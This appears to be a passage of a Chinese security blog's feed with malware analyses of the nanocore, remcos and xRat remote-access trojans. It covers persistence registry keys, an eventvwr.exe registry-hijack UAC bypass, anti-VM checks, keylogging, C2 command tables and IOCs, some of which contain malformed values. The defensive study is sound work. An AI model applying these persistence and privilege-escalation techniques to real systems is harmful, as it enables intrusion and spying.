src="https://i.loli.net/2020/02/11/EjXdvAFaYJoeknz.png" alt="image.png"></p><h3 id="DLL功能"><a href="#DLL功能" class="headerlink" title="DLL功能"></a>DLL功能</h3><h4 id="实现密码记录-登录命令-键盘命令等功能"><a href="#实现密码记录-登录命令-键盘命令等功能" class="headerlink" title="实现密码记录,登录命令,键盘命令等功能"></a>实现密码记录,登录命令,键盘命令等功能</h4><p><img src="https://i.loli.net/2020/02/11/G4kWKTYNBUjeMdp.png" alt="image.png"></p><h4 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h4><p>通过创建傀儡进程,使用正则匹配获得需要数据,传回服务器.</p><p><img src="https://i.loli.net/2020/02/11/L1QIt7SbGWjBmey.png" alt="image.png"></p><h5 id="傀儡进程"><a href="#傀儡进程" class="headerlink" title="傀儡进程"></a>傀儡进程</h5><h5 id="创建浏览器傀儡进程-采用shtml格式保存-并且正则匹配获取所需数据"><a href="#创建浏览器傀儡进程-采用shtml格式保存-并且正则匹配获取所需数据" class="headerlink" title="创建浏览器傀儡进程,采用shtml格式保存.并且正则匹配获取所需数据."></a>创建浏览器傀儡进程,采用<code>shtml</code>格式保存.并且正则匹配获取所需数据.</h5><p><img src="https://i.loli.net/2020/02/11/HWXyJ7op94iQ2cF.png" alt="image.png"></p><h6 id="傀儡进程-1"><a href="#傀儡进程-1" class="headerlink" title="傀儡进程"></a>傀儡进程</h6><p><img src="https://i.loli.net/2020/02/11/ytQcg5lpvTXEdzN.png" alt="image.png"></p><h4 id="其他功能一览"><a href="#其他功能一览" class="headerlink" title="其他功能一览"></a>其他功能一览</h4><ul><li>键盘记录,应用记录,dns记录,删除/导出日志,查看日志</li></ul><p><img src="https://i.loli.net/2020/02/11/OshaYDd9B3qtJWe.png" alt="image.png"></p><ul><li>写入,下载,登陆服务器</li></ul><p><img src="https://i.loli.net/2020/02/11/WvHt2oCeh1y4dXT.png" alt="image.png"></p><ul><li>z’x获取<code>DNS</code>记录</li></ul><p><img src="https://i.loli.net/2020/02/11/VsO3F4WMp5Zcwv1.png" alt="image.png"></p><h1 id="0x05-IOC"><a href="#0x05-IOC" class="headerlink" title="0x05 IOC"></a>0x05 IOC</h1><h2 id="PE文件"><a href="#PE文件" class="headerlink" title="PE文件:"></a>PE文件:</h2><ul><li><p>MD5: </p><p>bdc8945f1d799c845408522e372d1dbd</p><p>9c8242440c47a4f1ce2e47df3c3ddd28</p></li><li><p>SHA-1:8</p><p>74b7c3c97cc5b13b9dd172fec5a54bc1f258005</p><p>874f3caf663265f7dd18fb565d91b7d915031251</p></li><li><p>SHA-256: </p><p>61e9d5c0727665e9ef3f328141397be47c65ed11ab621c644b5bbf1d67138403</p><p>01e3b18bd63981decb384f558f0321346c3334bb6e6f97c31c6c95c4ab2fe354</p></li></ul><h2 id="URL"><a href="#URL" class="headerlink" title="URL:"></a>URL:</h2><p>XePeanut.chickenkiller.com:3064</p><p>ip:</p><table><thead><tr><th>ip</th><th>port</th></tr></thead><tbody><tr><td>69.171.234.29</td><td>3604</td></tr><tr><td>69.171.247.71</td><td></td></tr><tr><td>31.13.78.65</td><td></td></tr><tr><td>31.13.80.1</td><td></td></tr><tr><td>66.220.152.28</td><td></td></tr><tr><td>174.37.54.20</td><td></td></tr><tr><td>69.171.235.101</td><td></td></tr><tr><td>69.171.233.33</td><td></td></tr><tr><td>69.171.229.29</td><td></td></tr><tr><td>66.200.147.44</td><td></td></tr><tr><td>31.13.65.17</td><td></td></tr><tr><td>31.13.679.17</td><td></td></tr><tr><td>31.13.68.1</td><td></td></tr><tr><td>69.171.228.20</td><td></td></tr><tr><td>208.43.237.140</td></tr></tbody></table><p>基本都是b类地址.</p><h1 id="0x06-reference"><a href="#0x06-reference" class="headerlink" title="0x06 reference"></a>0x06 reference</h1><p><a href="https://zhuanlan.zhihu.com/p/69777677" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/69777677</a></p><p><a href="https://askleo.com/create-shortcut-bypasses-uac-program-needing-administrative-access/" target="_blank" rel="noopener">https://askleo.com/create-shortcut-bypasses-uac-program-needing-administrative-access/</a></p><p><a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/start-process?view=powershell-7" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/start-process?view=powershell-7</a></p><p><a href="https://3gstudent.github.io/3gstudent.github.io/结束进程导致BSOD的利用分析/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E7%BB%93%E6%9D%9F%E8%BF%9B%E7%A8%8B%E5%AF%BC%E8%87%B4BSOD%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x01-样本信息&quot;&gt;&lt;a href=&quot;#0x01-样本信息&quot; class=&quot;headerlink&quot; title=&quot;0x01 样本信息&quot;&gt;&lt;/a&gt;0x01 样本信息&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;样本名称: 31d4e0f1de4b81288aacf66d12f6d453&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;版本: 1.2.2.0&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;生成时间: 2017-06-13 7:30:11&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;样本大小:  207,360 字节&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;MD5:  31d4e0f1de4b81288aacf66d12f6d453&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;SHA-1: 865147146cea04c789e79404c5abd9a6e6254b9e&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;SHA-256: 5b2ffc4556a696bde5ecf74ea6ed809fc97edad58a24ed97a6dfc6a28e048b50&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;家族: nanocore&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;idb与样本地址:  &lt;a href=&quot;https://github.com/Xuwei98/malware-analysis-idb/tree/master/Trojan/2020-02-11-nanocore&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;github&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="样本分析" scheme="http://blog.dgmddw.xyz/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
      <category term="木马" scheme="http://blog.dgmddw.xyz/tags/%E6%9C%A8%E9%A9%AC/"/>
    
      <category term="C#" scheme="http://blog.dgmddw.xyz/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>remcos木马分析</title>
    <link href="http://blog.dgmddw.xyz/2020/02/04/2020-02-04-remcos%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/"/>
    <id>http://blog.dgmddw.xyz/2020/02/04/2020-02-04-remcos木马分析/</id>
    <published>2020-02-03T16:00:00.000Z</published>
    <updated>2020-03-07T13:13:29.324Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="0x01-样本信息"><a href="#0x01-样本信息" class="headerlink" title="0x01 样本信息"></a>0x01 样本信息</h1><ul><li><p>样本名称: remcos.exe</p></li><li><p>版本:1.7 pro</p></li><li><p>样本大小:  94208字节</p></li><li><p>MD5:  a546dc3262185f245aaf129d6da24303</p></li><li><p>SHA-1: fbaac085d0d9e85d44fb511643d3195084cc3beb</p></li><li><p>SHA-256: 8211ee73d0fa4ce5f22b044e4cffc7401be3bdd20ffd2e279b88f4f04fa421ee</p></li><li><p>家族: remcos-RAT</p></li><li><p>idb与样本地址:  <a href="https://github.com/Xuwei98/malware-analysis-idb/tree/master/Trojan/2020-02-04-remcos_rat" target="_blank" rel="noopener">github</a></p><a id="more"></a></li></ul><h1 id="0x02-分析环境"><a href="#0x02-分析环境" class="headerlink" title="0x02 分析环境"></a>0x02 分析环境</h1><ul><li>win10 x64 pro</li><li>VMware Workstaion 15</li></ul><h1 id="0x03-病毒行为"><a href="#0x03-病毒行为" class="headerlink" title="0x03 病毒行为"></a>0x03 病毒行为</h1><p><img src="https://i.loli.net/2020/02/04/GhvV5ZO7jomxWiQ.png" alt="image.png"></p><h2 id="释放文件"><a href="#释放文件" class="headerlink" title="释放文件"></a>释放文件</h2><p>%AppData%\remcos\logs.dat</p><p>%AppData%\remcos\remcos.exe</p><p>下面两个运行后自删除</p><p>%Temp%\install.bat</p><p>%Temp%\uninstall.bat</p><h2 id="注册表操作"><a href="#注册表操作" class="headerlink" title="注册表操作"></a>注册表操作</h2><p>不是都会存在</p><p>HKEY_CURRENT_USER\Software\remcos_mwbzcsvmezkjsfe\Inj</p><p>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Remcos</p><p>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</p><p>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</p><p>HKEY_CURRENT_USER\Software\remcos_mwbzcsvmezkjsfe\EXEpath</p><p>HKEY_CURRENT_USER\Software\remcos_mwbzcsvmezkjsfe\FR</p><p>HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command\origmsc</p><h1 id="0x04-分析"><a href="#0x04-分析" class="headerlink" title="0x04 分析"></a>0x04 分析</h1><h2 id="行为分析"><a href="#行为分析" class="headerlink" title="行为分析"></a>行为分析</h2><p>使用<code>hrsword</code>进行监控,<code>文件深度分析平台</code>和<code>IDA7.0</code>结合分析.</p><ol><li><p>拷贝自身,注册自启动注册表<img src="https://i.loli.net/2020/01/20/2Qc3njgENrFRmYW.png" alt="image.png"></p></li><li><p>创建新进程,结束自身,并进行第二次注册表操作.<img src="https://i.loli.net/2020/01/20/TaYsVze6Ubc8HL5.png" alt></p></li><li><p>生成新文件<code>install.bat</code>,并运行<img src="https://i.loli.net/2020/01/20/EROcAqaMgxzh39V.png" alt="image.png"></p></li><li><p>互斥量,可能是用于维持单程序运行.</p><p><img src="https://i.loli.net/2020/01/20/Pq6fQTzdvEhlkXF.png" alt="image.png"><img src="https://i.loli.net/2020/01/20/mBonYivOgKy9tQd.png" alt="image.png"></p></li><li><p>可能存在键盘记录器.实际图片较大,截取部分.<img src="https://i.loli.net/2020/01/20/pGPhUmxKYoTL4V2.png" alt="image.png"></p></li><li><p>网络连接可能为C2地址.</p><p>72[.]208.94.219:2125</p><p><img src="https://i.loli.net/2020/01/20/Z7RqQiSUkhHKydD.png" alt></p></li><li><p>资源表中存在疑似未知的加密数据</p></li></ol><h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><p>程序拷贝资源表并通过<code>RC4</code>解密,获取相关数据,主要逻辑如图,资源表第一位大小.据调试猜测程序通过一个4x4字节数组进行信息获取,<code>[1]</code>一般为字符串目的地址,其他暂无详细分析.</p><p><img src="https://i.loli.net/2020/02/05/fJKjYOI4UE93NLa.png" alt="image.png"></p><h3 id="RC4-KSA"><a href="#RC4-KSA" class="headerlink" title="RC4-KSA"></a>RC4-KSA</h3><p>用0初始化256位数组,然后计算,在进行<code>v5</code>和<code>v4</code>的交换.</p><p><img src="https://i.loli.net/2020/02/05/6A7caUDVvECF3IS.png" alt="image.png"></p><h3 id="RC4-PGRA"><a href="#RC4-PGRA" class="headerlink" title="RC4-PGRA"></a>RC4-PGRA</h3><p>被256取余,异或操作.</p><p><img src="https://i.loli.net/2020/02/05/UmjJy8DOGn2Y3Zt.png" alt="image.png"></p><h3 id="互斥量操作"><a href="#互斥量操作" class="headerlink" title="互斥量操作"></a>互斥量操作</h3><p>查询<code>Remcos_Mutex_Inj</code>互斥体是否存在,未存在就对注册表<code>HKEY_CURRENT_USER\\Software\\remcos_mwbzcsvmezkjsfe\\Inj</code>进行清理.然后创建互斥体<code>remcos_mwbzcsvmezkjsfe</code>,保证单一程序运行.</p><p><img src="https://i.loli.net/2020/02/05/fRqQP4SrEOlje7t.png" alt="image.png"></p><h3 id="动态获取函数地址"><a href="#动态获取函数地址" class="headerlink" title="动态获取函数地址"></a>动态获取函数地址</h3><p><img src="https://i.loli.net/2020/02/05/2PTiLyXDlBnsUMK.png" alt="image.png"></p><h3 id="sub-401000反调试-反虚拟机-反沙箱"><a href="#sub-401000反调试-反虚拟机-反沙箱" class="headerlink" title="sub_401000反调试,反虚拟机,反沙箱"></a>sub_401000反调试,反虚拟机,反沙箱</h3><ol><li>sandboie的dll<img src="https://i.loli.net/2020/02/05/IT4paEQAkvxqYKF.png" alt="image.png"></li><li>backdoor” I/O port for VMware<img src="https://i.loli.net/2020/02/05/rvjMAkh1ptzaYSi.png" alt="image.png"></li><li>virtualbox注册表<img src="https://i.loli.net/2020/02/05/6nhTj5kaSiNMosE.png" alt="image.png"></li><li>PEB,Ntglobalflag <img src="https://i.loli.net/2020/02/05/RJxVhw9uO82jmkZ.png" alt="image.png"></li></ol><h3 id="获取系统种类-执行相应的bypassUAC操作"><a href="#获取系统种类-执行相应的bypassUAC操作" class="headerlink" title="获取系统种类,执行相应的bypassUAC操作"></a>获取系统种类,执行相应的bypassUAC操作</h3><p>通过注册表获取系统类别,判断是否为管理员权限,进行对应bypassUAC操作.</p><p><img src="https://i.loli.net/2020/02/05/CJTVEj5zobqKMti.png" alt="image.png"></p><h4 id="XP"><a href="#XP" class="headerlink" title="XP"></a>XP</h4><p>系统查询为xp的话,创建<code>HKCU\\Software\\Classes\\mscfile\\shell\\open\\command\\origmsc</code>,并键值为当前文件地址</p><p><img src="https://i.loli.net/2020/02/05/V1OsIbaZPWwCQtM.png" alt="image.png"></p><h4 id="其它系统"><a href="#其它系统" class="headerlink" title="其它系统"></a>其它系统</h4><p>对<code>HKCR\\mscfile\\shell\\open\\command</code>键和<code>HKCU\\Software\\Classes\\mscfile\\shell\\open\\command</code>使用运行程序地址赋值.然后运行<code>eventvwr.exe</code>,使用高级权限运行木马程序,成功则退出.</p><p>原理简单说是<code>eventvwr.exe</code>拥有完整高级权限,会便遍历上述注册表并执行其中的值.类似于劫持掉<code>mmc.exe</code>程序,用高权限运行木马程序.</p><p>绕过详细原文在<a href="https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/" target="_blank" rel="noopener">这里</a></p><p><img src="https://i.loli.net/2020/02/05/XsGVBjiL1gfk9WZ.png" alt="image.png"></p><h4 id="关闭UAC"><a href="#关闭UAC" class="headerlink" title="关闭UAC"></a>关闭UAC</h4><p><img src="https://i.loli.net/2020/02/05/zsDLt3coV7FvqZn.png" alt="image.png"></p><h3 id="程序自我拷贝"><a href="#程序自我拷贝" class="headerlink" title="程序自我拷贝"></a>程序自我拷贝</h3><p><img src="https://i.loli.net/2020/02/05/vVOWEQA6qlkemUD.png" alt="image.png"></p><p>程序自我拷贝到<code>%AppData%\remcos</code>处</p><p><img src="https://i.loli.net/2020/01/22/gDrT7PaNkWl5CH8.png" alt="image.png"></p><p>拼接命令,创建<code>install.bat</code>文件并运行</p><p><img src="https://i.loli.net/2020/02/05/cz4GTLIh7WN8VyD.png" alt="image.png"></p><p>启动新remcos程序,并删除bat自身.<img src="https://i.loli.net/2020/01/22/yK2jIMHibQ9LFu1.png" alt="image.png"></p><h3 id="将资源放入注册表中"><a href="#将资源放入注册表中" class="headerlink" title="将资源放入注册表中"></a>将资源放入注册表中</h3><p><img src="https://i.loli.net/2020/02/04/xrzHDe2T48uSbEi.png" alt="image.png"></p><p>rc4解密后的数据放入其中</p><p><img src="https://i.loli.net/2020/02/05/Okx9Zwham8vNAM4.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/02/05/1S8QKcPvinhtRF6.png" alt="image.png"></p><h3 id="创建傀儡进程-注入"><a href="#创建傀儡进程-注入" class="headerlink" title="创建傀儡进程,注入"></a>创建傀儡进程,注入</h3><p>查询默认浏览器的文件位置.</p><p><img src="https://i.loli.net/2020/02/05/2uKoVW1gZEslk9T.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/02/05/pHyq4s3UO26MYBC.png" alt="image.png"></p><p>创建注入互斥体<code>Remcos_mutex_Inj</code>,并进行注入,成功后进行注册表操作,设置值为1,失败则释放互斥体.</p><p><img src="https://i.loli.net/2020/02/05/Peqx9U3gVY6DaZX.png" alt="image.png"></p><p>使用ie浏览器将自身注入进去.</p><p><img src="https://i.loli.net/2020/02/05/3tfpLXNaABKGiuD.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/02/05/LksTlfEtvnKWa9Q.png" alt="image.png"></p><h3 id="弹出cmd窗口并打印商品信息"><a href="#弹出cmd窗口并打印商品信息" class="headerlink" title="弹出cmd窗口并打印商品信息"></a>弹出cmd窗口并打印商品信息</h3><p><img src="https://i.loli.net/2020/02/05/voKxkDGIVAUQ4sz.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/02/05/8KyYEIqQ1Fo5LG4.png" alt="image.png"></p><h3 id="创建消息循环窗口"><a href="#创建消息循环窗口" class="headerlink" title="创建消息循环窗口"></a>创建消息循环窗口</h3><p><img src="https://i.loli.net/2020/02/05/ShRl5O9QsMCN3z4.png" alt="image.png"></p><h3 id="启动键盘记录器"><a href="#启动键盘记录器" class="headerlink" title="启动键盘记录器"></a>启动键盘记录器</h3><p>两个函数都几乎相同,第一个函数拥有记录窗口,剪贴板的功能.</p><p><img src="https://i.loli.net/2020/02/05/YDibsqocdOmQkWV.png" alt="image.png"></p><h3 id="获取录音音频"><a href="#获取录音音频" class="headerlink" title="获取录音音频"></a>获取录音音频</h3><p><img src="https://i.loli.net/2020/02/05/uSt1F7WhrmYVNPl.png" alt="image.png"></p><h3 id="禁用DEP保护"><a href="#禁用DEP保护" class="headerlink" title="禁用DEP保护"></a>禁用DEP保护</h3><p>获取函数地址</p><p><img src="https://i.loli.net/2020/02/05/t4F7e9frAsLMOGc.png" alt="image.png"></p><p>dwflag = 0,禁用本进程DEP保护</p><p><img src="https://i.loli.net/2020/02/05/eU26pywhoMaOqHQ.png" alt="image.png"></p><h3 id="连接服务器-执行远控等功能"><a href="#连接服务器-执行远控等功能" class="headerlink" title="连接服务器,执行远控等功能"></a>连接服务器,执行远控等功能</h3><p>连接C&amp;C成功后发送的数据一览。使用<code>|cmd|</code>分割,然后进行主要程序远控功能执行.</p><p><img src="https://i.loli.net/2020/01/22/gLbvS7ea5h2QAlD.png" alt="image.png"></p><h3 id="键盘记录器"><a href="#键盘记录器" class="headerlink" title="键盘记录器"></a>键盘记录器</h3><p>通过创建新线程,使用<code>SetWindowsHookExA</code>进行Hook,并使用<code>GetMessageA</code>获取信息,并进行消息分发.</p><p><img src="https://i.loli.net/2020/02/04/btImyHSeTAcPMQN.png" alt="image.png"></p><p><code>fn</code>函数记录细节部分如图.通过<code>wParam</code>判断键盘消息事件<code>WM_KEYDOWN</code>,<code>WM_KEYUP</code>,<code>WM_SYSKEYDOWN</code>来分别分别执行对应消息处理函数.</p><p><img src="https://i.loli.net/2020/02/04/fpG1BdTxJrYiEPF.png" alt="image.png"></p><h3 id="远控功能"><a href="#远控功能" class="headerlink" title="远控功能"></a>远控功能</h3><p>信息分发远控功能函数起始地址在头部偏移<code>0xA71E</code>处.根据表格阐述字符与主要功能。</p><table><thead><tr><th>字符</th><th>功能</th></tr></thead><tbody><tr><td>keepaliveoff</td><td>打印格式为”%02i:%02i:%02i:%03i [KeepAlive]”的当地时间字符串</td></tr><tr><td>filemgr</td><td>进行各种文件管理,如上传下载,删除添加,获取磁盘文件列表等</td></tr><tr><td>downloadfromurltofile</td><td>从url处下载文件并打开</td></tr><tr><td>getproclist</td><td>通过创建快照进行进程列表获取</td></tr><tr><td>prockill</td><td>结束进程</td></tr><tr><td>getwindows</td><td>枚举顶级窗口</td></tr><tr><td>closewindow</td><td>关闭窗口</td></tr><tr><td>maxwindow</td><td>最大化窗口</td></tr><tr><td>restorewindow</td><td>激活并显示窗口</td></tr><tr><td>closeprocfromwindow</td><td>通过窗口PID关闭进程</td></tr><tr><td>execcom</td><td>运行指定程序</td></tr><tr><td>consolecmd</td><td>cmd控制台</td></tr><tr><td>openaddress</td><td>打开网页</td></tr><tr><td>initializescrcap</td><td>使用图像函数捕捉屏幕</td></tr><tr><td>freescrcap</td><td>关闭对应socket</td></tr><tr><td>initklfrm</td><td>获得键盘布局</td></tr><tr><td>startonlinekl</td><td>开启在线键盘记录器</td></tr><tr><td>stoponlinekl</td><td>停止记录</td></tr><tr><td>autogetofflinelogs/getofflinelogs</td><td>获得离线日志</td></tr><tr><td>deletekeylog</td><td>删除日志文件</td></tr><tr><td>clearlogins</td><td>清楚cookies和存储记录</td></tr><tr><td>initregedit</td><td>输入表初始化</td></tr><tr><td>dllurl</td><td>从url地址下载url，并进行映射</td></tr><tr><td>dlldata</td><td>内存空间映射dll</td></tr><tr><td>getclipboard/setclipboard</td><td>获取或者设置剪贴板</td></tr><tr><td>msgbox</td><td>自定义消息弹窗</td></tr><tr><td>uninstall</td><td>创建并执行uninstall.bat删除自身文件，exe文件和文件夹</td></tr><tr><td>updatefromurl</td><td>从url处更新文件</td></tr><tr><td>updatefromlocal</td><td>从本地更新文件</td></tr><tr><td>dwnldscr</td><td>获得屏幕截图</td></tr><tr><td>*camcap</td><td>摄像头相关</td></tr></tbody></table><h1 id="0x05-IOC"><a href="#0x05-IOC" class="headerlink" title="0x05 IOC"></a>0x05 IOC</h1><p>72[.]208.94.219:2125</p><h1 id="0x06总结"><a href="#0x06总结" class="headerlink" title="0x06总结"></a>0x06总结</h1><p>该木马为remcos木马.只分析客户端去推算客户端整体功能具有一定的复杂度.需要较多的时间,进行挨个分析.该木马前后连接紧密,函数跳转较多,不容易很好的去衔接上下文.不过着手点着重在api上,通过字符串与api就能较为有效推算分析处函数功能.</p><h1 id="0x07-reference"><a href="#0x07-reference" class="headerlink" title="0x07 reference"></a>0x07 reference</h1><p><a href="https://www.pediy.com/kssd/pediy11/123117.html" target="_blank" rel="noopener">https://www.pediy.com/kssd/pediy11/123117.html</a></p><p><a href="https://www.jianshu.com/p/d60381a57f42" target="_blank" rel="noopener">https://www.jianshu.com/p/d60381a57f42</a></p><p><a href="https://secrary.com/ReversingMalware/RemcosRAT/" target="_blank" rel="noopener">https://secrary.com/ReversingMalware/RemcosRAT/</a></p><p><a href="https://www.ctolib.com/topics-54916.html" target="_blank" rel="noopener">https://www.ctolib.com/topics-54916.html</a></p><p><a href="https://blog.prowling.nu/2012/09/modifying-virtualbox-settings-for.html?m=1" target="_blank" rel="noopener">https://blog.prowling.nu/2012/09/modifying-virtualbox-settings-for.html?m=1</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x01-样本信息&quot;&gt;&lt;a href=&quot;#0x01-样本信息&quot; class=&quot;headerlink&quot; title=&quot;0x01 样本信息&quot;&gt;&lt;/a&gt;0x01 样本信息&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;样本名称: remcos.exe&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;版本:1.7 pro&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;样本大小:  94208字节&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;MD5:  a546dc3262185f245aaf129d6da24303&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;SHA-1: fbaac085d0d9e85d44fb511643d3195084cc3beb&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;SHA-256: 8211ee73d0fa4ce5f22b044e4cffc7401be3bdd20ffd2e279b88f4f04fa421ee&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;家族: remcos-RAT&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;idb与样本地址:  &lt;a href=&quot;https://github.com/Xuwei98/malware-analysis-idb/tree/master/Trojan/2020-02-04-remcos_rat&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;github&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="样本分析" scheme="http://blog.dgmddw.xyz/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
      <category term="VC" scheme="http://blog.dgmddw.xyz/tags/VC/"/>
    
      <category term="木马" scheme="http://blog.dgmddw.xyz/tags/%E6%9C%A8%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>xRat远控木马分析</title>
    <link href="http://blog.dgmddw.xyz/2020/01/15/2020-01-15-xRat%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/"/>
    <id>http://blog.dgmddw.xyz/2020/01/15/2020-01-15-xRat木马分析/</id>
    <published>2020-01-14T16:00:00.000Z</published>
    <updated>2020-03-07T13:12:16.768Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="0x01-样本信息"><a href="#0x01-样本信息" class="headerlink" title="0x01 样本信息"></a>0x01 样本信息</h1><ul><li><p>样本名称: b3ebd2b0ac287940648975bcad2458543679748a15949f246a745c5db926a18d</p></li><li><p>样本大小:  252,416 字节</p></li><li><p>家族: xRat</p></li><li><p>MD5:  2b82375303c9e02ae15b0dd6e2bd0cb1</p></li><li><p>SHA-1: d5dbab5cca2a370dffb7225aecbc3cf65</p></li><li><p>SHA-256: b3ebd2b0ac287940648975bcad2458543679748a15949f246a745c5db926a18d</p></li><li><p>idb与样本地址:  <a href="https://github.com/Xuwei98/malware-analysis-idb/tree/master/Trojan/2020-01-15-xrat" target="_blank" rel="noopener">github</a></p><a id="more"></a></li></ul><h1 id="0x02-分析环境"><a href="#0x02-分析环境" class="headerlink" title="0x02 分析环境"></a>0x02 分析环境</h1><ul><li>win10 x64 pro</li><li>VMware Workstaion 15</li></ul><h1 id="0x03-病毒行为"><a href="#0x03-病毒行为" class="headerlink" title="0x03 病毒行为"></a>0x03 病毒行为</h1><h2 id="释放文件"><a href="#释放文件" class="headerlink" title="释放文件"></a>释放文件</h2><p>%AppData%/Subdir/client.exe</p><p>%AppData%/Logs/MM-dd-yyyy</p><h2 id="设置注册表"><a href="#设置注册表" class="headerlink" title="设置注册表"></a>设置注册表</h2><p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Quasar Client Startup\%CueurrentPath%</p><p>X64:</p><p>nHKEY_CURRENT_USER\“SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run”\Quasar Client Startup\%CurrentPath%</p><p>X32:</p><p>nHKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Quasar Client Startup\%CurrentPath%</p><p> 调用插件功能增加以下注册表</p><p>l HKEY_LOCAL_MACHINE\ SOFTWARE\Microsoft\Windows\CurrentVersion\Run\%Name%\%Path%</p><p>l HKEY_LOCAL_MACHINE\ SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\%Name%\%Path%</p><p>l HKEY_CURRENT_USER\ SOFTWARE\Microsoft\Windows\CurrentVersion\Run\%Name%\%Path%</p><p>l HKEY_CURRENT_USER\ SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\%Name%\%Path%</p><p> X64特有:</p><p>HKEY_LOCAL_MACHINE\ SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\%Name%\%Path%</p><p>HKEY_LOCAL_MACHINE\ SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce\%Name%\%Path%</p><h1 id="0x04-分析"><a href="#0x04-分析" class="headerlink" title="0x04 分析"></a>0x04 分析</h1><p>一、    基本功能描述</p><ul><li><p>缓冲TCP/IP网络流</p></li><li><p>发送和接收序列化数据的协议缓冲区</p></li><li><p>压缩（QuickLZ）和加密（AES-128）通信</p></li><li><p>多线程</p></li><li><p>UPnP支持</p></li><li><p>支持no-Ip.com</p></li><li><p>提升管理特权的定制社会工程策略（betabot的技巧）</p></li><li><p>访问网站（隐藏和可见）</p></li><li><p>显示消息框</p></li><li><p>任务管理器</p></li><li><p>文件管理器</p></li><li><p>开机启动管理</p></li><li><p>远程桌面</p></li><li><p>远程外壳</p></li><li><p>下载并执行</p></li><li><p>上传并执行</p></li><li><p>系统信息</p></li><li><p>计算机命令（重启、关机、待机）</p></li><li><p>键盘记录器</p></li><li><p>反向SOCKS5/HTTPS代理</p></li></ul><h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><h3 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h3><p><img src="https://i.loli.net/2020/03/07/qWIGrOy3PdZnoTf.png" alt="image.png"></p><h3 id="初始化函数"><a href="#初始化函数" class="headerlink" title="初始化函数"></a>初始化函数</h3><p>String_3 = %AppData%</p><p><img src="https://i.loli.net/2020/03/07/qWIGrOy3PdZnoTf.png" alt></p><h3 id="主要功能函数"><a href="#主要功能函数" class="headerlink" title="主要功能函数"></a>主要功能函数</h3><p>为多线程创建互斥量</p><p>计算必要必要信息</p><p>C2服务器地址端口存储</p><p>获取拷贝文件地址</p><p><img src="https://i.loli.net/2020/03/07/qWIGrOy3PdZnoTf.png" alt></p><p>根据geoip获取地址信息.</p><p>删除之前下载的描述文件以便于隐藏信息</p><p>如果不在特定文件夹中,关闭互斥量,拷贝并执行文件</p><p>设置注册表自行启动.</p><p>执行后门功能</p><p>执行键盘记录器,并且自身不退出.</p><p><img src="https://i.loli.net/2020/03/07/fVgoeFJ4ZiMtC1d.png" 